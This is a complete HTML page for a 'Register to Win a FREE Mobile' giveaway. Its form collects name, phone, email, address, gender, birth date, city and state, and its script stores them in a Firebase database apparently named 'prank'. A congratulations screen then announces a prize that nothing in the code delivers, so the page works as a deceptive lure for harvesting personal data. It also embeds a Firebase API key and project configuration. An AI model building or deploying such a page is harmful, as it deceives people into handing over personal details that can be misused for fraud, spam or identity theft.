<!DOCTYPE html>
<html>
<head>
<title>User Registration Form</title>

<style>

body{
    font-family: Arial;
    background-image:url("https://cdn.pixabay.com/photo/2016/11/29/09/32/blur-1868502_1280.jpg");
    background-size:cover;
    margin:0;
}

.form-box{
    width:400px;
    margin:50px auto;
    padding:25px;
    background:rgba(255,255,255,0.85);
    border-radius:10px;
    border:3px solid #4CAF50;
    box-shadow:0 0 15px gray;
    text-align:center;
}

.form-box img{
    width:200px;
    margin-bottom:15px;
}

input, textarea{
    width:100%;
    padding:8px;
    margin-top:5px;
    margin-bottom:15px;
    border:2px solid #ccc;
    border-radius:5px;
}

input[type=submit]{
    background:#4CAF50;
    color:white;
    padding:10px 15px;
    border:none;
    border-radius:5px;
    cursor:pointer;
}

input[type=reset]{
    background:#f44336;
    color:white;
    padding:10px 15px;
    border:none;
    border-radius:5px;
}

#success{
    display:none;
    text-align:center;
    padding:50px;
    color:white;
    background:linear-gradient(135deg,#ff512f,#dd2476);
    min-height:100vh;
}

#success img{
    width:220px;
    margin:10px;
}

</style>

</head>

<body>

<div class="form-box" id="formSection">

<h2>Register to Win a FREE Mobile</h2>

<img src="https://cdn.pixabay.com/photo/2016/11/29/05/08/smartphone-1867461_1280.jpg">

<form id="registrationForm">

<label>Full Name:</label>
<input type="text" id="name" required>

<label>Mobile Number:</label>
<input type="tel" id="mobile" required>

<label>Email:</label>
<input type="email" id="email" required>

<label>Address:</label>
<textarea id="address"></textarea>

<label>Gender:</label><br>
<input type="radio" name="gender" value="Male"> Male
<input type="radio" name="gender" value="Female"> Female
<input type="radio" name="gender" value="Other"> Other
<br><br>

<label>Date of Birth:</label>
<input type="date" id="dob">

<label>City:</label>
<input type="text" id="city">

<label>State:</label>
<input type="text" id="state">

<input type="submit" value="Submit">
<input type="reset" value="Reset">

</form>

</div>


<div id="success">

<h1>🎉 Congratulations! 🎉</h1>
<h2>You have won a FREE Mobile!</h2>
<p>Please wait some time to receive your gift.</p>

<img src="https://cdn.pixabay.com/photo/2017/01/06/19/15/smartphone-1957740_640.jpg">
<img src="https://cdn.pixabay.com/photo/2016/11/29/05/08/smartphone-1867461_640.jpg">

</div>


<!-- Firebase SDK -->
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

<script>

const firebaseConfig = {
  apiKey: "AIzaSyC2Abo_CQlRRpM9NhkSU4ebLEXnU993LV8",
  authDomain: "prank-7047a.firebaseapp.com",
  databaseURL: "https://prank-7047a-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "prank-7047a",
  storageBucket: "prank-7047a.firebasestorage.app",
  messagingSenderId: "885039406464",
  appId: "1:885039406464:web:f1913483ea8849e3c97565",
  measurementId: "G-8KDW6R7G89"
};

firebase.initializeApp(firebaseConfig);

var database = firebase.database();

document.getElementById("registrationForm").addEventListener("submit", function(e){

e.preventDefault();

var name = document.getElementById("name").value;
var mobile = document.getElementById("mobile").value;
var email = document.getElementById("email").value;
var address = document.getElementById("address").value;
var dob = document.getElementById("dob").value;
var city = document.getElementById("city").value;
var state = document.getElementById("state").value;

var gender = document.querySelector('input[name="gender"]:checked')?.value;

database.ref("registrations").push({
name:name,
mobile:mobile,
email:email,
address:address,
gender:gender,
dob:dob,
city:city,
state:state
});

document.getElementById("formSection").style.display="none";
document.getElementById("success").style.display="block";

});

</script>

</body>
</html>
